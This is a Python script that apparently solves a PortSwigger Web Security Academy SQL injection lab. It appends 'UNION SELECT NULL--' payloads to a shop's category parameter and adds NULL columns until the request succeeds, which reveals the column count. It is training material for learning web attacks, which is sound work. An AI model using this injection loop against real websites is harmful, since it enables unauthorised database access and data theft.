#!/usr/bin/env python3
import requests
import sys

# Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

# API Parameters
url = 'https://abcd.web-security-academy.net/'
url = f'{url}page'
params = {'category': 'Lifestyle'}
null = ["'UNION SELECT", 'NULL', '--']
sqli = {'category': f"Lifestyle{' '.join(null)}"}

# API Request
api_session = requests.Session()
response = api_session.get(url, params=params)

if response.status_code == 404:
    sys.exit('The session you are looking for has expired')


def sqli_union_lab_1(null, sqli):
    """
    To solve the lab, perform an SQL injection UNION attack that returns an additional row containing null values.
    :param null: Copy of global null variable
    :param sqli: Copy of global sqli variable
    :return:
    """
    # Perform a new requests with sqli parameters
    lab1 = api_session.get(url, params=sqli)

    while not lab1.ok:
        # Remove '--' then add ', NULL --' until lab1.ok is True
        null.remove('--')
        null.extend([',', 'NULL', '--'])

        # Perform a new request with the updated list
        sqli['category'] = f"Lifestyle{' '.join(null)}"
        lab1 = api_session.get(url, params=sqli)

    print(f"There are {null.count('NULL')} columns")

    # Return null since it now has the amount of NULL's required to exploit the application
    return null

if __name__ == '__main__':
    null = sqli_union_lab_1(null=null.copy(), sqli=sqli.copy())
